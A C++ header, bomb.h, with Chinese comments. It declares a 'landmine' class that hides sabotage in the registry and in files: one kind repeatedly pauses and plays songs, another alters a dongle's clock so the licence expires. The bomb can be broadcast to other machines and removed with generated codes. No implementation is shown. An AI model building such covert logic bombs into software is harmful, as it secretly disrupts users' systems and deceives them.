// bomb.h
//

#ifndef __BOMB_H__
#define __BOMB_H__

//////////////////////////////////////////////////////////////////////////
// 地雷
const int BOMB_NONE  = 0;      //没有炸弹
const int BOMB_SONG  = 1;      //歌曲炸弹，频繁暂停,播放
const int BOMB_STOP_DOG  = 2;  //修改加密狗的时间，让其过期

const int BOMB_MAX_TYPE = 3;  //炸弹种类数

class bomb
{
public:
	bomb();
	~bomb();

	/*
	功能：安装地雷
	参数：
	    bomb_type：地雷的类型
		allow_broadcast：是否广播出去
	返回值：
	   true:成功
	   false：失败
	*/
	bool embed_bomb(int bomb_type,bool allow_broadcast);

	/*
	功能：查找地雷
	参数：
	   void
   返回值：
       地雷的类型
	*/
	int check_bomb(void);

	/*
	功能：移出炸弹功能
	参数：
	   void
   返回值：
       true：成功
	   false失败
	*/
	bool bomb_out(void);

	/*
	功能：广播炸弹类型
	参数：
		bomb_type：炸弹类型
	返回值：
		void
	*/
	void broadcast(int bomb_type);

	/*
	功能：得到炸弹的类型
	参数：
	    void
	返回值：
	    炸弹类型
	*/
	int get_bomb_type(void);

	/*
	功能：生成验证码
	参数：
	   code：验证码
   返回值：
       true：成功
	   flase：失败
	*/
	bool make_authentication_code(TCHAR *code);

	/*
	功能：生成密钥
	参数：
	   authentication_code：验证码
	   code1：第一组密钥
	   code2：第二组密钥
   返回值：
       true：成功
	   false：失败
	*/
	bool make_bomb_code(TCHAR *authentication_code,TCHAR *code1,TCHAR *code2);

private:
	/*
	功能：读取或写入注册表炸弹
	参数：
		operate:操作。1：读取 2：写 3：清除炸弹
		bomp_type：炸弹类型
	返回值：
		炸弹类型
	*/
	int set_reg_bomb(int operate, int bomp_type);

	/*
	功能：把炸弹写入到文件中
	参数：
		bomb_type：炸弹类型
	返回值：
		true;成功
		false：失败
	*/
	bool write_file_bomb(int bomb_type);

	//启动接受炸弹消息的线程
	static DWORD WINAPI start_thread(void* pParam);
	void bomb_thread(void);

	int m_bomb_type;	         // 地雷标志
	TCHAR m_bomb_file_path[256]; // 埋地雷的文件
	bool m_thread_run;           //线程运行标志
	HANDLE m_thread_event_handle;//事件句柄
};

#endif //__BOMB_H__
